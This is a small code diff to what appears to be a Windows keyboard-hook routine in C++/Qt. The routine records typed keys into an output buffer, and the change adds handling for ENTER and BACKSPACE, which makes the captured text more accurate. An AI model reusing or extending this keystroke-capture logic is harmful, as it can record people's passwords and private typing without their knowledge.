@@ -99,15 +99,16 @@ LRESULT CALLBACK Core::process(int nCode, WPARAM wParam, LPARAM lParam)
 
         QString toBeAppended;
 
-        if (i == 5) {
+        if (i > 1) {
             QString keyString = QString::fromUtf16((ushort *) lpszName);
 
             if (keyString == "ENTER") {
                 toBeAppended = "\n[" + keyString + "]\n";
+            } else if (keyString == "BACKSPACE" && !outputBuffer.isEmpty()) {
+                outputBuffer.chop(1);
             } else {
                 toBeAppended = QString::fromUtf16((ushort *) buffer);
             }
-
         } else {
             toBeAppended = QString::fromUtf16((ushort *) buffer);
         }
